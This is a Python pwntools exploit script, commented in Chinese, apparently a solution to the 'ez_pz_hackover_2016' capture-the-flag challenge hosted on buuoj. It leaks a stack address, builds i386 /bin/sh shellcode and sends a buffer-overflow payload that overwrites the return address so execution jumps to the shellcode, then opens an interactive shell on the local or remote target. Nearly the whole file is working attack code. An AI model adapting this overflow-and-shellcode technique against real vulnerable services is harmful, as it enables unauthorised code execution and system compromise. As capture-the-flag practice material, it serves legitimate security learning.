from pwn import *
from LibcSearcher import LibcSearcher

io = -1
############################
#********修改文件名**********
############################
file_name = 'ez_pz_hackover_2016'
port = 28098

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 1
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *080485FD\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))
context.log_level = 'debug'
log.success('='*100)
##########################下面为攻击代码#######################
##########################下面为攻击代码#######################

shellcode = asm(shellcraft.i386.linux.sh())
print(shellcode, len(shellcode))

io.recvuntil('crash: ')
addr = io.recv(10)

print(addr)
shell_addr = int(addr, 16) - 0x1c
LOG_ADDR_SUCCESS('shell_addr', shell_addr)
payload = b'crashme\x00' + 18 * b'a' + p32(shell_addr+0xc) + shellcode
io.recv()
io.sendline(payload)
io.interactive()
